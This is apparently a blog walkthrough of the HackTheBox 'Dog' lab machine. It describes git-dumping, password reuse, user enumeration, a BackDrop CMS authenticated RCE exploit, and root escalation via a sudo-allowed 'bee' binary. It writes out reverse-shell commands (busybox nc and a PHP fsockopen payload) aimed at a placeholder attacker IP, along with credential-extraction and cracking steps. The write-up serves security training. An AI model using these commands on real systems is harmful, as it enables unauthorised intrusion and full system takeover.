## Hello everyone!

Today, we will explore “*Dog*”, an easy-level machine released by **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Dog/Dog_images/1.png)

(Please ensure that you have added the following line  `TARGET_IP     dog.htb` to your local `/etc/hosts` file)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to obtain comprehensive results:

![image](/HTB/Dog/Dog_images/2.png)

We gathered significant information here. We identify two exposed services running on the target:

**SSH** (OpenSSH 8.2p1 | 22)

**HTTP** (Apache 2.4.41 (Ubuntu)) | 80)

The **Nmap Script Engine** provides multiple pieces of information about the website hosted on port **80**: The webserver is running BackDrop CMS 1. Furthermore, we can identify a `.git` directory which could contain sensitive information and a `robots.txt` file which points various endpoint such as `/user/login` to disable for the browser’s crawlers. Let’s inspect these resources:

![image](/HTB/Dog/Dog_images/3.png)

Exposed `.git` directories are dangerous because they allow attackers to reconstruct the entire source code, often revealing credentials or sensitive logic.

There are various resources available for us. We can use a tool like git-dumper to fetch it locally to our machine and inspect closely.

(You may need to install some dependencies to make the Python script functional. The best way to install all in one is to run `git clone https://github.com/arthaud/git-dumper`, `cd git-dumper`, then `pip3 install -r requirements.txt` to install what you need)

![image](/HTB/Dog/Dog_images/4.png)

We then need to provide the target URL and the `.git` repository to the script in order to download it:

![image](/HTB/Dog/Dog_images/5.png)

![image](/HTB/Dog/Dog_images/6.png)

Once all has been installed, we can access the .`git` directory from our machine.

After inspecting the directories, we can identify an interesting settings.php file which contains a MySQL database password:

![image](/HTB/Dog/Dog_images/7.png)

Interesting, maybe a user uses this password to authenticate.

We can use `ffuf` to brute force the `/?q=accounts` endpoint in order to identify valid users on the system through which we could attempt to authenticate on the login panel. We will run the following command:

`ffuf -u "http://dog.htb/?q=accounts/FUZZ" \
-w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt`

![image](/HTB/Dog/Dog_images/8.png)

We observe different response sizes when valid usernames are queried, allowing user enumeration. We already can identify a few users: **john, tiffany, morris, axel, rosa**

We can attempt the `BackDropJ2024DS2024` for these users on the login panel:

![image](/HTB/Dog/Dog_images/9.png)

We successfully authenticate on the login panel as the user **tiffany**!

This suggests poor password hygiene and reuse across multiple services.

We can now access the restricted dashboard.




## Initial Access



Since we identified the present web application handled by the webserver which is BackDrop CMS and we gained an authenticated access on the application, let’s research about a potential vulnerability associated to it:

![image](/HTB/Dog/Dog_images/10.png)

There is a GitHub repository which hosts a Python script. As we obtained legitimate credentials, we can use this scripts allowing us to achieve an *Authenticated Remote Code Execution* in order to obtain initial access on the target. Although the exact version is not disclosed, the application behavior matches vulnerable BackDrop CMS 1.x instances. We will install it and the requirements and execute it without providing anything to obtains more information about its usage:

![image](/HTB/Dog/Dog_images/11.png)

We simply need to provide the target URL with the legitimate credentials we obtained before. We will execute the following command:

`python3 exploit.py http://dog.htb tiffany BackDropJ2024DS2024`

![image](/HTB/Dog/Dog_images/12.png)

We successfully obtained initial access on the machine as **www-data**!

Since our obtained shell could be quite unstable, we can set up a **Netcat listener** using `nc -lvnp PORT` and initiate a new reverse shell running the following command:

`busybox nc YOUR_IP NC_PORT 4444 -e sh`

![image](/HTB/Dog/Dog_images/13.png)

We can then stabilize our new shell with the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'` 

`export TERM=xterm`

We can start by inspecting the /etc/passwd file to see what users exists on the system and can be a potential pivot point for us:

![image](/HTB/Dog/Dog_images/14.png)

We can identify two non-root users presents on the system: **jobert** and **johncusack**. Can we access their `/home` directory?

![image](/HTB/Dog/Dog_images/15.png)

Indeed, we can, but we can’t do much. We are able to list the `/home/johncusack` directory and locate the user flag, but unfortunately, we can’t read it. We will need to find a way to perform horizontal privilege escalation.

If we remember, we found earlier valid credentials attached to a MySQL server that was running locally on the target. As we obtained an access on the local system, we can read the database content with the following command:

`mysql -u root -pPASSWORD`

![image](/HTB/Dog/Dog_images/16.png)

It works! We can now navigate to the user table in order to see whether we can catch a password hash for a user present on the system:

![image](/HTB/Dog/Dog_images/17.png)

We can identify the hashed password for the user **jobert**! We can paste it into a `hash.txt` and attempt to crack it offline. We can pass the file to hashcat using the `—-identify` option to get the hash algorithm and the hash method to use:

![image](/HTB/Dog/Dog_images/18.png)

The password is hashed through Drupal7 hash format. We can attempt to crack it using the following command:

`hashcat -m 7900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

But it takes a long time. Maybe the solution is simpler. Since the same password was reused for Tiffany, we can hypothesize credential reuse across services. What happens if we try the identified password a third time on one of the system user to authenticate us via SSH ?

![image](/HTB/Dog/Dog_images/19.png)

It worked! The `BackDropJ2024DS2024` password has been reused again through SSH, allowing us to pivot our initial access to **johncusack**. We can now list our current directory and retrieve the first flag:


![image](/HTB/Dog/Dog_images/20.png)




## Vertical Privilege Escalation



We now need to escalate our current privileges to **root** in order to get the final flag.

Since we have a legitimate password for **johncusack**, we can run `sudo -l` to see whether we are able to execute any command with **root privileges**:

![image](/HTB/Dog/Dog_images/21.png)

We can run the following command as **root**: `/usr/local/bin/bee`. We can visit GTFOBins to obtain more information about the binary’s usage to escalate our privilege:

![image](/HTB/Dog/Dog_images/22.png)

We can learn here that `bee` is a specific binary to BackDrop CMS. It allows to execute some PHP code. However, in order to make the `eval` function operational, we need to execute the command in the `/var/www/html` web root’s directory, otherwise it will not work.

Since the command can be executed with **root privileges** via sudo, we can use a standard PHP reverse-shell payload to spawn a **Bash root shell**:

`sudo bee eval "\$sock=fsockopen(\"YOUR_IP\",NC_PORT);proc_open(\"/bin/sh\", array(0=>\$sock, 1=>\$sock, 2=>\$sock), \$pipes);"`

(ensure that you have set up a Netcat listener with a port configured respectively to catch the connection)

![image](/HTB/Dog/Dog_images/23.png)

We successfully escalated our privileges to **root**, granting us a total access on the target system. We can now navigate to the `/root` directory and retrieve the final flag:

![image](/HTB/Dog/Dog_images/24.png)

Challenge completed!

![image](/HTB/Dog/Dog_images/25.png)




## Conclusion


The *Dog* Machine demonstrates how low-impact misconfigurations can be combined into full system compromise. We started by enumerating a `.git` web directory containing sensitive information such as a MySQL password that has been reused through multiple users: we gained access as the user **tiffany** to a restricted dashboard, allowing us to achieve an authenticated remote code execution against the BackDrop CMS web application. We obtained an initial access which allowed us to enumerate two users on the system, one of which reused the same password as tiffany and the MySQL **root** user. It led us to abuse a sudo misconfiguration which allowed us to execute PHP code with **root privileges**. Since we were able to execute the code of our choice, we used a simple PHP reverse-shell payload to initiate a connection back to a listener we set up, finally granting us total access on the system. 

This challenge highlights the importance of choosing secure and unique passwords.

Thank you for reading!
